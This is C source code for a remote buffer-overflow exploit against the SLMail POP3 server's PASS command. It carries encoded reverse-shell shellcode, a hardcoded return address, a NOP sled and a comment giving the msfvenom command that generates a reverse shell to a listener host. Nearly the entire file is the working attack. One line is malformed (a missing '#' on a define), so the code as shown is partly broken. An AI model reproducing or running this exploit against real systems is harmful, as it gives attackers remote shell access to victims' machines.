#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
define retadd "\x8f\x35\x4a\x5f" /*win2k server sp4 0x5f4a358f*/
#define port 110

/* revshell العراق القراصنة المجموعة*/
/*msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.194 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai*/

char shellcode[] =
"\xbb\x51\x8f\x99\x1b\xdb\xd1\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xc0\x04\x31\x58\x0e\x03\x09\x81\x7b\xee\x55\x75\xf9"
"\x11\xa5\x86\x9e\x98\x40\xb7\x9e\xff\x01\xe8\x2e\x8b\x47\x05"
"\xc4\xd9\x73\x9e\xa8\xf5\x74\x17\x06\x20\xbb\xa8\x3b\x10\xda"
"\x2a\x46\x45\x3c\x12\x89\x98\x3d\x53\xf4\x51\x6f\x0c\x72\xc7"
"\x9f\x39\xce\xd4\x14\x71\xde\x5c\xc9\xc2\xe1\x4d\x5c\x58\xb8"
"\x4d\x5f\x8d\xb0\xc7\x47\xd2\xfd\x9e\xfc\x20\x89\x20\xd4\x78"
"\x72\x8e\x19\xb5\x81\xce\x5e\x72\x7a\xa5\x96\x80\x07\xbe\x6d"
"\xfa\xd3\x4b\x75\x5c\x97\xec\x51\x5c\x74\x6a\x12\x52\x31\xf8"
"\x7c\x77\xc4\x2d\xf7\x83\x4d\xd0\xd7\x05\x15\xf7\xf3\x4e\xcd"
"\x96\xa2\x2a\xa0\xa7\xb4\x94\x1d\x02\xbf\x39\x49\x3f\xe2\x55"
"\xbe\x72\x1c\xa6\xa8\x05\x6f\x94\x77\xbe\xe7\x94\xf0\x18\xf0"
"\xdb\x2a\xdc\x6e\x22\xd5\x1d\xa7\xe1\x81\x4d\xdf\xc0\xa9\x05"
"\x1f\xec\x7f\x89\x4f\x42\xd0\x6a\x3f\x22\x80\x02\x55\xad\xff"
"\x33\x56\x67\x68\xd9\xad\xe0\x57\xb6\xae\x32\x3f\xc5\xb0\xb3"
"\x7b\x40\x56\xd9\x6b\x05\xc1\x76\x15\x0c\x99\xe7\xda\x9a\xe4"
"\x28\x50\x29\x19\xe6\x91\x44\x09\x9f\x51\x13\x73\x36\x6d\x89"
"\x1b\xd4\xfc\x56\xdb\x93\x1c\xc1\x8c\xf4\xd3\x18\x58\xe9\x4a"
"\xb3\x7e\xf0\x0b\xfc\x3a\x2f\xe8\x03\xc3\xa2\x54\x20\xd3\x7a"
"\x54\x6c\x87\xd2\x03\x3a\x71\x95\xfd\x8c\x2b\x4f\x51\x47\xbb"
"\x16\x99\x58\xbd\x16\xf4\x2e\x21\xa6\xa1\x76\x5e\x07\x26\x7f"
"\x27\x75\xd6\x80\xf2\x3d\xe6\xca\x5e\x17\x6f\x93\x0b\x25\xf2"
"\x24\xe6\x6a\x0b\xa7\x02\x13\xe8\xb7\x67\x16\xb4\x7f\x94\x6a"
"\xa5\x15\x9a\xd9\xc6\x3f";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2605);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("192.168.3.189");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
